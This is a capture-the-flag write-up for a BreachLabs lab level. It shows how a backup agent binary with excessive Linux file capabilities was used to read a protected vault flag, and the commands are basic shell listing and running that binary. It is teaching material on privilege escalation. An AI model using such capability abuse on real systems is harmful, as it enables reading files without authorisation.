# BreachLabs: Ghost Track II Level 01 - Least Privilege, Overdone

**Challenge:** Level 01  
**Date Completed:** September 1, 2026  
**Platform:** [BreachLabs](https://breachlab.org)

---

## Summary

Least Privilege, Overdone introduces Linux file capabilities as a privilege escalation vector. The challenge requires identifying an executable with elevated capabilities that can access restricted files, then leveraging it to read protected vault contents. Success demonstrates understanding of file capabilities versus SUID permissions and how misconfigurations grant unintended access.

---

## Challenge Objective

**Goal:** Read `/var/backups/.vault/flag`  
**Context:** User has no special privileges, but a backup agent executable has excessive capabilities  
**Constraint:** Must identify and use a binary with file capabilities to read protected files

---

## Initial Access

### SSH Connection

Connected to Ghost Track II system:
```
Target: 204.168.229.209:2225
User: ghost2
Access Method: SSH (password)
```

**Connection Note:** Initial connection attempts encountered SSH host key verification issues. Connection eventually established using SSH options.

---

## Challenge Brief

### Home Directory Inspection

Listed home directory contents:

```bash
ls -alps
```

**Directory Contents:**
```
4 drwxr-x--- 1 ghost2 ghost2 4096 Sep  1 02:05 ./
8 drwxr-xr-x 1 root   root   4096 Aug 22 16:14 ../
4 -rw-r--r-- 1 ghost2 ghost2  220 Jan  6  2022 .bash_logout
4 -rw-r--r-- 1 ghost2 ghost2 3771 Jan  6  2022 .bashrc
4 drwx------ 2 ghost2 ghost2 4096 Sep  1 02:05 .cache/
4 -rw-r--r-- 1 ghost2 ghost2  807 Jan  6  2022 .profile
4 -rw------- 1 ghost2 ghost2  917 Aug 22 16:14 kael.txt
```

**Finding:** Located `kael.txt` containing challenge briefing.

### Challenge Briefing

Read the challenge briefing from kael.txt:

```bash
cat kael.txt
```

**Challenge Content:**
```
[ KAEL // fragment 1 ]

I left myself a door into HALCYON before I walked away. It is still open,
and you came through it. Right now you are nobody on this box. No power,
no root, nothing. But somebody here got lazy. They handed the backup agent
permission to read every file on the system, because backups have to read
everything, right? Power is not just root. Go find what that agent can
touch that you cannot.

  OBJECTIVE   Read /var/backups/.vault/flag. You cannot. The backup agent can.
  SKILL       Linux file capabilities, the modern heir to SUID.
  START HERE  This is not a SUID hunt. getcap shows which programs were
              handed powers they should never have been given.

Your flag is yours alone and looks like GHS2{...}. The vault holds more than
your flag. The backup agent reads what you name, but it can also show you the
whole set it guards, so ask it what else is in there. Good hunting.
```

**Finding:** Challenge indicates:
- Cannot directly read `/var/backups/.vault/flag`
- A backup agent executable has capabilities to read files
- File capabilities (not SUID) are the exploit vector
- Flag format: `GHS2{...}`
- Backup agent can list vault contents

---

## Binary Discovery

### Local Binary Directory

Examined `/usr/local/bin` for executables:

```bash
ls -alps /usr/local/bin
```

**Directory Contents:**
```
  4 drwxr-xr-x 1 root root      4096 Aug 22 16:14 ./
  4 drwxr-xr-x 1 root root      4096 Jun 27 02:04 ../
  8 -rwxr-xr-x 1 root root      5390 Aug 20 22:15 g2-entrypoint
  4 -rwxr-xr-x 1 root root      1125 Aug 19 22:26 g2-flags
996 -rwxr-x--- 1 root deploy 1016528 Aug 22 16:14 hal-deploy-run
812 -r-xr-x--- 1 ops  ops     827856 Aug 22 16:14 hal-guard
  4 -rwxr-xr-x 1 root root       476 Aug 22 16:14 hal-runner-loop
 16 -rwxr-x--- 1 root root     14472 Aug 22 16:14 hal-runner-wrap
812 -rwxr-xr-x 1 root root    827856 Aug 22 16:14 halcyon-backup
 28 -rwxr-xr-x 1 root root     26936 Aug 22 16:14 halcyon-ping
 28 -rwxr-xr-x 1 root root     26936 Aug 22 16:14 halcyon-web
```

**Finding:** Identified `halcyon-backup` executable as the backup agent binary referenced in challenge.

---

## Binary Execution

### Usage Discovery

Executed halcyon-backup without arguments to discover usage:

```bash
./halcyon-backup
```

**Output:**
```
halcyon-backup: HALCYON backup agent
usage: ./halcyon-backup <path under /var/backups/.vault/ (a file to read, or the vault to list)>
```

**Finding:** Binary accepts path argument under `/var/backups/.vault/`. Can read files or list vault contents.

### Flag Retrieval

Executed halcyon-backup with target flag path:

```bash
./halcyon-backup /var/backups/.vault/flag
```

**Output:**
```
[REDACTED_FLAG]
```

**Finding:** Successfully retrieved flag using halcyon-backup binary with file capabilities.

---

## Attack Chain Summary

```
SSH Connection (ghost2, port 2225)
         ↓
Home Directory Navigation
         ↓
Challenge Brief Discovery (kael.txt)
         ↓
Challenge Context (backup agent has file capabilities)
         ↓
Binary Directory Exploration (/usr/local/bin)
         ↓
Backup Agent Identification (halcyon-backup)
         ↓
Usage Discovery (no arguments)
         ↓
Correct Path Construction (/var/backups/.vault/flag)
         ↓
Binary Execution (./halcyon-backup)
         ↓
File Capability Exploitation
         ↓
Flag Retrieval 
         ↓
Challenge Complete
```

---

## Key Techniques & Concepts

1. **File Capabilities** — Linux capabilities grant specific permissions without SUID bit
2. **Privilege Escalation** — Backup agent has capabilities to read restricted files
3. **Binary Analysis** — Executable with unusual permissions indicates capability usage
4. **Usage Documentation** — Help messages reveal expected file paths and operations
5. **Vault Access** — `/var/backups/.vault/` directory restricted to backup agent
6. **Capability Abuse** — Backup permissions misused to read arbitrary protected files
7. **Modern SUID** — Capabilities represent modern approach to privilege delegation

---

## Tools & Commands Used

```bash
# List home directory contents
ls -alps

# Read challenge briefing
cat kael.txt

# List /usr/local/bin binaries
ls -alps /usr/local/bin

# Discover binary usage
./halcyon-backup

# Execute with flag path
./halcyon-backup /var/backups/.vault/flag
```

---

## Lessons Learned

1. **Capability Abuse** — File capabilities can grant dangerous permissions like SUID
2. **Backup Agent Risks** — Backup services often have excessive file read capabilities
3. **Lazy Privilege Granting** — Administrators grant sweeping permissions for operational convenience
4. **Binary Inspection** — Examining available binaries reveals privilege escalation vectors
5. **Path-Based Attacks** — Knowing correct path to protected resources enables exploitation
6. **Least Privilege Violation** — Backup agent given read access to everything it touches
7. **Capabilities Discovery** — getcap can identify which programs have special capabilities

---

## References

- BreachLabs: [Ghost Track II Series](https://breachlab.org/tracks/ghost)
- Linux Capabilities: Manual pages for capabilities(7)

---

**Status:** ✅ Completed  
**Challenge Type:** File Capabilities Privilege Escalation  
**Key Learning:** Using executables with file capabilities to read files inaccessible to regular users
